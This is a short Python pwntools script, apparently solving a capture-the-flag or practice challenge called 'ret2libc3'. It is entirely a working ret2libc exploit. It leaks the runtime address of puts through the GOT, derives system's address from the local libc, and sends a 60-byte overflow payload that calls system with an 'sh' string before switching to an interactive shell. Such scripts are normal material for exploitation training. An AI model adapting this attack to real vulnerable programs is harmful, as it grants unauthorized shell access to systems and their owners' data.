from pwn import *

elf1 = ELF("./ret2libc3")

#elf2 = ELF("./libc-2.19.so")
#libc版本不对,所以采用下面的这个方式得到本地使用的libc版本：elf2 = ELF("/lib/i386-linux-gnu/libc.so.6")

elf2 = ELF("/lib/i386-linux-gnu/libc.so.6")

io = process("./ret2libc3")

io.recv()

puts_got = elf1.got["puts"]

#print(str(puts_got))

io.sendline(str(puts_got))

io.recvuntil(b": ")

puts_addr = int(io.recvuntil(b"\n",drop = True), 16)

print("puts_address is %s" %(hex(puts_addr)))

libc_base = elf2.symbols["system"] - elf2.symbols["puts"]

print("libc_base is %s" %(hex(libc_base)))

system_addr = puts_addr + libc_base

print("system_address is %s" %(hex(system_addr)))

payload = flat( cyclic(60), system_addr, 0xdeadbeef, next(elf1.search(b"sh\x00")))

#payload = b'A'*60 + p32(system_addr) + p32(0xdeadbeef) + p32(next(elf1.search(b"sh\x00")))

io.sendline(payload)

io.interactive()

